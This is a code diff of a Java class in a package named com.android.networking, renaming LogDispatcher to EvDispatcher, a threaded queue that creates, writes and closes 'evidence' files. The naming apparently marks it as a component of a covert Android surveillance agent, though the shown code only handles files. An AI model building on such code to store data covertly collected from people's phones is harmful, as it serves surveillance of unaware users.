@@ -23,14 +23,14 @@ import com.android.networking.file.Path;
 import com.android.networking.util.Check;
 
 /**
- * The Class LogDispatcher collects LogR messages and manages the evidence
+ * The Class EvDispatcher collects LogR messages and manages the evidence
  * creation, write and close.
  */
-public class LogDispatcher extends Thread implements Runnable {
-	private static final String TAG = "LogDispatcher"; //$NON-NLS-1$
+public class EvDispatcher extends Thread implements Runnable {
+	private static final String TAG = "EvDispatcher"; //$NON-NLS-1$
 
 	/** The singleton. */
-	private volatile static LogDispatcher singleton;
+	private volatile static EvDispatcher singleton;
 
 	/** The q. */
 	private final BlockingQueue<Packet> queue;
@@ -61,7 +61,7 @@ public class LogDispatcher extends Thread implements Runnable {
 	/**
 	 * Instantiates a new log dispatcher.
 	 */
-	private LogDispatcher() {
+	private EvDispatcher() {
 		halt = false;
 
 		queue = new LinkedBlockingQueue<Packet>();
@@ -83,8 +83,6 @@ public class LogDispatcher extends Thread implements Runnable {
 	 */
 	private void processQueue() {
 		Packet p;
-		// if(AutoConfig.DEBUG) Check.log( TAG  ;//$NON-NLS-1$
-		// " processQueue() Packets in Queue: " + q.size());
 
 		if (queue.size() == 0) {
 			return;
@@ -102,22 +100,25 @@ public class LogDispatcher extends Thread implements Runnable {
 			}
 			return;
 		}
-
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (processQueue): " + p.getCommand());
+		}
 		switch (p.getCommand()) {
+
 		case LogR.LOG_CREATE:
-			createLog(p);
+			createEv(p);
 			break;
 
 		case LogR.LOG_ATOMIC:
-			atomicLog(p);
+			atomicEv(p);
 			break;
 
 		case LogR.LOG_WRITE:
-			writeLog(p);
+			writeEv(p);
 			break;
 
 		case LogR.LOG_CLOSE:
-			closeLog(p);
+			closeEv(p);
 			break;
 
 		default:
@@ -135,11 +136,11 @@ public class LogDispatcher extends Thread implements Runnable {
 	 * 
 	 * @return the log dispatcher
 	 */
-	public static LogDispatcher self() {
+	public static EvDispatcher self() {
 		if (singleton == null) {
-			synchronized (LogDispatcher.class) {
+			synchronized (EvDispatcher.class) {
 				if (singleton == null) {
-					singleton = new LogDispatcher();
+					singleton = new EvDispatcher();
 				}
 			}
 		}
@@ -171,9 +172,6 @@ public class LogDispatcher extends Thread implements Runnable {
 			try {
 				while (queue.isEmpty() && !halt) {
 					synchronized (emptyQueue) {
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " (run): notify empty queue");
-						}
 						emptyQueue.notifyAll();
 					}
 					noLogs.await();
@@ -259,7 +257,7 @@ public class LogDispatcher extends Thread implements Runnable {
 	 *            the p
 	 * @return true, if successful
 	 */
-	private boolean createLog(final Packet p) {
+	private boolean createEv(final Packet p) {
 		if (Cfg.DEBUG) {
 			Check.ensures(!evidences.containsKey(p.getId()), "evidence already mapped"); //$NON-NLS-1$
 		}
@@ -281,7 +279,7 @@ public class LogDispatcher extends Thread implements Runnable {
 	 * @param p
 	 *            the p
 	 */
-	private void atomicLog(final Packet p) {
+	private void atomicEv(final Packet p) {
 		if (Cfg.DEBUG) {
 			Check.ensures(!evidences.containsKey(p.getId()), "evidence already mapped"); //$NON-NLS-1$
 		}
@@ -302,7 +300,7 @@ public class LogDispatcher extends Thread implements Runnable {
 	 *            the p
 	 * @return true, if successful
 	 */
-	private boolean writeLog(final Packet p) {
+	private boolean writeEv(final Packet p) {
 		if (evidences.containsKey(p.getId()) == false) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Requested log not found"); //$NON-NLS-1$
@@ -324,7 +322,7 @@ public class LogDispatcher extends Thread implements Runnable {
 	 *            the p
 	 * @return true, if successful
 	 */
-	private boolean closeLog(final Packet p) {
+	private boolean closeEv(final Packet p) {
 		if (evidences.containsKey(p.getId()) == false) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Requested log not found"); //$NON-NLS-1$
